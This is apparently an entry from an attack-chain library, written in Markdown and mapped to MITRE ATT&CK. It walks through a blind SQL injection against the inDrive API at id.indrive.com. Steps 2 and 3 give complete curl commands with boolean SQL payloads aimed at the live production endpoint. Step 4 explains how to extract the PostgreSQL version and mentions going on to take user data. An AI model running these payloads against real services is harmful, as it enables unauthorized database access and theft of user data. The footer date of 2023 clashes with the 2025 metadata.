---
tags:
  - blind-sqli
  - sql-injection
  - web-vulnerability
  - data-exfiltration
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-blind-sqli-true-condition]]'
  - '[[commands/curl-blind-sqli-false-condition]]'
platforms:
  - Web
  - PostgreSQL
complexity: medium
procedures:
  - '[[procedures/Access-Promo-Page-and-Trigger-API-Request]]'
  - '[[procedures/Inject-True-SQL-Condition-via-Curl]]'
  - '[[procedures/Inject-False-SQL-Condition-via-Curl]]'
  - '[[procedures/Extract-Database-Information-via-Blind-SQLi]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Multi-stage blind SQL injection attack exploiting unsanitized URL path
  parameters in the inDrive API to extract database information like PostgreSQL
  version.
skill_level: intermediate
impact_level: high
id: f1ef3504-93ad-4209-909a-29820e503a7a
created_at: '2025-12-14T03:15:10.061Z'
updated_at: '2025-12-14T03:15:10.061Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Blind SQL Injection via Unsanitized URL Path in inDrive API

## Overview

This attack chain demonstrates a blind SQL injection vulnerability in the inDrive API endpoint at id.indrive.com. The flaw arises from unsanitized user input in URL path parameters, allowing attackers to inject arbitrary SQL commands into database queries. By observing differences in server responses to true and false conditions, attackers can infer and extract sensitive database information, such as the PostgreSQL version (14.8 on Ubuntu), and potentially exfiltrate user data. The attack begins with accessing a promo page to trigger a legitimate request, then modifies the path with SQL payloads to confirm the injection and extract data.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Promo Page] --> B[Inject True Condition]
    B --> C[Inject False Condition]
    C --> D[Extract Database Info]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform with API endpoint at https://id.indrive.com
- PostgreSQL database (version 14.8 on Ubuntu)
- Network access to the promo page at https://promo.indrive.com

### Initial Access Requirements

- Public internet access
- No credentials required
- Ability to send HTTP GET requests mimicking browser behavior

## Detailed Attack Procedures

### Step 1: Access Promo Page and Trigger API Request
procedure: [[procedures/Access-Promo-Page-and-Trigger-API-Request]]

**Objective**: Establish a baseline legitimate request to the vulnerable API endpoint by interacting with the promo page.

**Instructions**: Navigate to the promo page and simulate user interaction to generate the initial API call. This confirms the endpoint structure: https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone.

**Expected Output**: A successful GET request returning promo-related data.

**Success Indicators**:
- Valid JSON response with database entries
- No errors in request execution

### Step 2: Inject True SQL Condition via Curl
procedure: [[procedures/Inject-True-SQL-Condition-via-Curl]]

**Objective**: Test the injection point by injecting a true SQL condition to elicit a non-empty response, confirming SQL execution.

**Instructions**: Use [[commands/curl-blind-sqli-true-condition]] to modify the URL path with the payload 'or 1=1--', which always evaluates to true and returns a random database entry.

```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

**Expected Output**: HTTP response with JSON containing a random database entry.

**Success Indicators**:
- Non-empty JSON response
- Presence of data indicating true condition

### Step 3: Inject False SQL Condition via Curl
procedure: [[procedures/Inject-False-SQL-Condition-via-Curl]]

**Objective**: Confirm the injection by injecting a false condition that results in an empty response, differentiating from the true case.

**Instructions**: Execute [[commands/curl-blind-sqli-false-condition]] with the payload 'or 1=2--' to trigger a false condition.

```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

**Expected Output**: Empty or error response indicating no data.

**Success Indicators**:
- Empty JSON array or 404-like response
- Clear difference from true condition response

### Step 4: Extract Database Information via Blind SQLi
procedure: [[procedures/Extract-Database-Information-via-Blind-SQLi]]

**Objective**: Use boolean-based blind SQLi to infer and extract database details, such as version, through conditional payloads.

**Instructions**: Build on previous injections by crafting payloads like 'AND (SELECT version() LIKE "PostgreSQL%")' in the URL path, observing response differences to extract info bit by bit. For example, modify the curl command to test version substrings.

**Expected Output**: Inferred data like "PostgreSQL 14.8 on Ubuntu" via successive true/false responses.

**Success Indicators**:
- Successful inference of database version
- Ability to chain conditions for further exfiltration

## Attack Chain Summary

### Key Achievements

1. Confirmed blind SQLi vulnerability in API path parameters
2. Differentiated true/false responses to validate injection
3. Extracted PostgreSQL version and potential for sensitive data leak

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01*
